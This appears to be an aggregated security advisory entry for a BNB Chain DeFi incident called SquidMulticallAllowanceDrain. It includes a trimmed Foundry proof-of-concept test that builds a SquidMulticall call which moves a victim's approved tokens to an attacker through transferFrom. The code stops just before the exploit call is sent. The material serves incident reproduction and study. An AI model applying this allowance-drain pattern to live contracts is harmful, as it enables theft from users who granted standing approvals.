# [?] SquidMulticallAllowanceDrain - Arbitrary Call / Wrong Approval

## Summary
Severity: Unknown
Chain: BNB Chain
Component: SquidMulticallAllowanceDrain
Published: 2026-04-07
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/SquidMulticallAllowanceDrain_exp.sol
Type: defi-exploit-poc

## Details
Lost: 1 ETH

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 91_122_249;
        vm.createSelectFork("bsc", forkBlock);

        fundingToken = address(ETH_TOKEN);
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(SQUID_MULTICALL, "SquidMulticall");
        vm.label(VICTIM, "Victim");
        vm.label(address(ETH_TOKEN), "ETH Token");
    }

    function testExploit() public balanceLog {
        uint256 attackerBefore = ETH_TOKEN.balanceOf(ATTACKER);
        uint256 victimBefore = ETH_TOKEN.balanceOf(VICTIM);
        uint256 allowanceBefore = ETH_TOKEN.allowance(VICTIM, SQUID_MULTICALL);
        uint256 drainAmount = 1 ether;

        assertEq(allowanceBefore, type(uint256).max, "victim did not approve SquidMulticall");
        assertGe(victimBefore, drainAmount, "victim did not hold enough ETH");

        // step 1: build the same SquidMulticall Call shape used by the exploit transaction.
        ISquidMulticall.Call[] memory calls = new ISquidMulticall.Call[](1);
        calls[0] = ISquidMulticall.Call({
            callType: ISquidMulticall.CallType.Default,
            target: address(ETH_TOKEN),
            value: 0,
            callData: abi.encodeCall(IERC20.transferFrom, (VICTIM, ATTACKER, drainAmount)),
            payload: bytes("")
        });

        // step 2: any caller can make SquidMulticall execute the token transferFrom.
        vm.prank(ATTACKER, ATTACKER);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/SquidMulticallAllowanceDrain_exp.sol_
